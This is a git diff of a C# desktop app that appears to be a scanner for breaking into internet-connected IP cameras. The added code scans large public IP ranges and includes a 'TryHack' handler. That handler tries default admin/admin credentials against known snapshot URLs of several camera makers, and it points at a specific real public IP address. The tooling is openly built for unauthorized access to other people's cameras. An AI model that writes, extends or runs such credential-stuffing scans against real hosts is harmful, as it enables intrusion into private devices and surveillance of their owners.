@@ -1,5 +1,7 @@
 ﻿using IpScanApp.Clases;
 using IpScanApp.Classes;
+using Newtonsoft.Json;
+using Newtonsoft.Json.Linq;
 using SnmpSharpNet;
 using System;
 using System.Collections.Generic;
@@ -226,7 +228,21 @@ namespace WpfApplication1
                     txt.WriteLine(ip);
                 }
             }
-        }                
+        }            
+        
+        private List<Manufacturer> GetManufacturers()
+        {
+            //JObject o1 = JObject.Parse(File.ReadAllText(@"Resources\manufacturers.json"));
+            return JsonConvert.DeserializeObject<List<Manufacturer>>(File.ReadAllText(@"Resources\manufacturers.json"));
+            // read JSON directly from a file
+            //using (StreamReader file = File.OpenText(@"c:\videogames.json"))
+            //using (JsonTextReader reader = new JsonTextReader(file))
+            //{
+            //    JObject o2 = (JObject)JToken.ReadFrom(reader);
+            //    //return o2.ToObject<List<Manufacturer>>;
+            //    return null;
+            //}
+        }
 
         private List<string> SortIps(string[] unsortedIps)
         {
@@ -315,34 +331,35 @@ namespace WpfApplication1
             new Thread(() => new Bot("newvision", "/tmpfs/auto.jpg", "admin", "admin").ScanList(lines)).Start();
 
         }
+
+        private void StartScanFromFile()
+        {
+            foreach (var ipRange in GetIpRanges())
+            {
+                new Bot("newvision", "/tmpfs/auto.jpg", "admin", "admin").ScanRangeAsync(ipRange.IpBegin, ipRange.IpEnd);
+            }
+        }
         
         private void btnReadData_Click(object sender, RoutedEventArgs e)
         {
-            //var ipRange = GetIpRanges()[0];
-
-            //new Thread(() => new Bot("newvision", "/tmpfs/auto.jpg", "admin", "admin").AsyncScanRange(ipRange.IpBegin, ipRange.IpEnd)).Start();
-
-            foreach (var ipRange in GetIpRanges())
-            {
-                new Bot("newvision", "/tmpfs/auto.jpg", "admin", "admin").AsyncScanRange(ipRange.IpBegin, ipRange.IpEnd);
-            }
+            new Thread(() => StartScanFromFile()).Start();
         }
 
         private void btnAsyncScan_Click(object sender, RoutedEventArgs e)
         {            
             //new Thread(() => new Bot("newvision", "/tmpfs/auto.jpg", new NetworkCredential("admin", "admin")).RunAsync()).Start();
-            new Thread(() => new Bot("defeway", "/cgi-bin/snapshot.cgi?chn=0&u=admin&p=&q=1").AsyncScanFrom(new IpAddress("152.168.0.0"))).Start();
+            new Thread(() => new Bot("defeway", "/cgi-bin/snapshot.cgi?chn=0&u=admin&p=&q=1").ScanFromAsync(new IpAddress("152.168.0.0"))).Start();
         }
 
         private void btnScanRange_Click(object sender, RoutedEventArgs e)
         {
-            new Thread(() => new Bot("defeway", "/cgi-bin/snapshot.cgi?chn=0&u=admin&p=&q=1")
-                .AsyncScanRange(new IpAddress("152.168.0.0"), new IpAddress("152.171.255.255"), 60001))
-                .Start();
-
-            //new Thread(() => new Bot("newvision", "/tmpfs/auto.jpg", "admin", "admin")
-            //    .AsyncScanRange(new IpAddress("152.168.0.0"), new IpAddress("152.171.255.255")))
+            //new Thread(() => new Bot("defeway", "/cgi-bin/snapshot.cgi?chn=0&u=admin&p=&q=1")
+            //    .ScanRangeAsync(new IpAddress("152.170.0.0"), new IpAddress("152.170.255.255"), 60001))
             //    .Start();
+
+            new Thread(() => new Bot("newvision", "/tmpfs/auto.jpg", "admin", "admin")
+                .ScanRangeAsync(new IpAddress("152.170.0.0"), new IpAddress("152.170.255.255")))
+                .Start();
         }
 
         private void btnScanSavedCameras_Click(object sender, RoutedEventArgs e)
@@ -421,6 +438,26 @@ namespace WpfApplication1
                 }
             }
             return result;
+        }
+
+        private void btnTryHack_Click(object sender, RoutedEventArgs e)
+        {
+            foreach (var manufacturer in GetManufacturers())
+            {
+                new Bot(manufacturer.Name, manufacturer.Uri , "admin", "admin")
+                .TryHack("186.147.241.108");
+
+                //new Thread(() => new Bot(manufacturer.Name, manufacturer.Uri)
+                //.TryHack("186.147.241.108"))
+                //.Start();
+            }
+        }
+
+        private void btnClassifier_Click(object sender, RoutedEventArgs e)
+        {
+            new Thread(() => new Bot().ScanAllRangeWithClassifierAsync(new IpAddress("152.170.0.0"), 
+                new IpAddress("152.170.255.255")))
+                .Start();
         }
     }
 }
